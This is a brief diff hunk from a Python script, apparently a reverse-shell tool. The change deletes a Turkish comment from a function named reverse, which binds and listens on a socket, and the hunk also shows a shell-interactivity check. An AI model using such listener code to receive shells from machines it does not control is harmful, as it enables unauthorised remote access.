@@ -16,7 +16,6 @@ Author:ibrahim @via Gizem Bulut
 tty='[ -z "$PS1" ] && echo "[+] Interactive" || echo "[-] Not interactive" '
 def reverse(port):
     try:
-        #port kendi bilgisayarımızdan açılır ve baglanılır
         reverseshell=socket.socket()
         reverseshell.bind((socket.gethostname(),int(port)))
         reverseshell.listen(1)
